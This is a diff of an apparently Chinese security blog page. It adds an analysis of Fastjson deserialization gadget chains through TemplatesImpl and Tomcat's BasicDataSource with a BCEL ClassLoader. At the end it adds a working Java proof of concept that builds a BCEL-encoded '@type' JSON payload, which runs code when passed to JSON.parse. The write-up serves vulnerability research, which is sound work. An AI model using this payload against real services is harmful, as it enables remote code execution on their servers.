@@ -96,12 +96,16 @@
                 <p>&nbsp;&nbsp;&nbsp;1. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
                 	<p>(需要parse或者parseObject第二个参数为Feature.SupportNonPublicField)</p>
                 	
-                	<p>&nbsp;&nbsp;&nbsp;2. org.apache.tomcat.dbcp.dbcp2.BasicDataSource(需要dbcp或tomcat-dbcp的依赖)</p>
+                	<p>&nbsp;&nbsp;&nbsp;3. org.apache.tomcat.dbcp.dbcp.BasicDataSource(需要dbcp或tomcat-dbcp的依赖)</p>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;3. org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>
+                		<p>(Tomcat8.0后的版本，同样需要dbcp或tomcat-dbcp的依赖)</p>
                 
                 
                 <h2 class="section-heading">TemplatesImpl</h2>
                 
-                <p>&nbsp;&nbsp;&nbsp;这种利用方式比较苛刻，需要parse或者parseObject第二个参数为Feature.SupportNonPublicField。</p>
+                <p>&nbsp;&nbsp;&nbsp;这种利用方式比较苛刻，需要parse或者parseObject第二个参数为Feature.SupportNonPublicField，否则无法访问。
+                	因为TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，fastjson只能反序列化public。</p>
                 	
                 <a data-fancybox="gallery" href="../img/2022-5-8/1-1.jpg">
                 	<img class="img-fluid" src="../img/2022-5-8/1-1.jpg" alt="">
@@ -177,12 +181,6 @@
                 	<img class="img-fluid" src="../img/2022-5-8/1-11.jpg" alt="">
               	</a>
               	
-								
-              	
-              	
-              	
-              	
-                
                 
                 
                 <h2 class="section-heading">POC</h2>
@@ -208,14 +206,65 @@
               	
                 <h2 class="section-heading">BasicDataSource</h2>
                
-               <p>&nbsp;&nbsp;&nbsp;</p>
+               <p>&nbsp;&nbsp;&nbsp;这条利用链主要是利用tomcat中com.sun.org.apache.bcel.internal.util.ClassLoader#loadclass方法加载bcel字节码，之后调用defineClass进行加载字节码。
+               	这里先来到org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection方法中，这里调用了createDataSource方法。</p>
                 	
-                <a data-fancybox="gallery" href="../img/2022-5-8/1-1.jpg">
-                	<img class="img-fluid" src="../img/2022-5-8/1-1.jpg" alt="">
+                <a data-fancybox="gallery" href="../img/2022-5-8/2-1.jpg">
+                	<img class="img-fluid" src="../img/2022-5-8/2-1.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;接着调用了createConnectionFactory方法，继续跟进一下。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-5-8/2-2.jpg">
+                	<img class="img-fluid" src="../img/2022-5-8/2-2.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;来到这里就开始有头绪了，这里调用了Class.forName方法去加载driverClassName，之后调用loadClass加载。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-5-8/2-3.jpg">
+                	<img class="img-fluid" src="../img/2022-5-8/2-3.jpg" alt="">
               	</a>
               	
               	
-
+              	<p>&nbsp;&nbsp;&nbsp;在loadClass方法中可以看到这里判断class_name是否为BECL编码，是的话传入createClass方法。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-5-8/2-4.jpg">
+                	<img class="img-fluid" src="../img/2022-5-8/2-4.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;到了createClass方法，这里用Utility.decode方法将BECL编码转为了字节码。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-5-8/2-5.jpg">
+                	<img class="img-fluid" src="../img/2022-5-8/2-5.jpg" alt="">
+              	</a>
+              	
+              	
+              	
+              	<h2 class="section-heading">POC</h2>
+              	
+								<div>
+									
+									<pre class='hljs'><code>public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span> {
+    <span class="hljs-type">JavaClass</span> cls = <span class="hljs-type">Repository</span>.lookupClass(<span class="hljs-type">BasicPoc</span>.class);
+    <span class="hljs-type">String</span> code = <span class="hljs-type">Utility</span>.encode(cls.getBytes(), <span class="hljs-literal">true</span>);
+    <span class="hljs-type">String</span> bcelcode = <span class="hljs-string">"$$BCEL$$"</span> + code;
+//        new <span class="hljs-type">ClassLoader</span>().loadClass(code).newInstance();
+    <span class="hljs-type">String</span> payload = <span class="hljs-string">"{\n"</span> +
+            <span class="hljs-string">"    {\n"</span> +
+            <span class="hljs-string">"        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n"</span> +
+            <span class="hljs-string">"        \"x\":{\n"</span> +
+            <span class="hljs-string">"                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"</span> +
+            <span class="hljs-string">"                \"driverClassLoader\": {\n"</span> +
+            <span class="hljs-string">"                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n"</span> +
+            <span class="hljs-string">"                },\n"</span> +
+            <span class="hljs-string">"                \"driverClassName\": \""</span> + bcelcode + <span class="hljs-string">"\"\n"</span> +
+            <span class="hljs-string">"        }\n"</span> +
+            <span class="hljs-string">"    }: \"x\"\n"</span> +
+            <span class="hljs-string">"}"</span>;
+    <span class="hljs-type">JSON</span>.parse(payload);
+}</code></pre>
+									
+									</div>
 
 
 
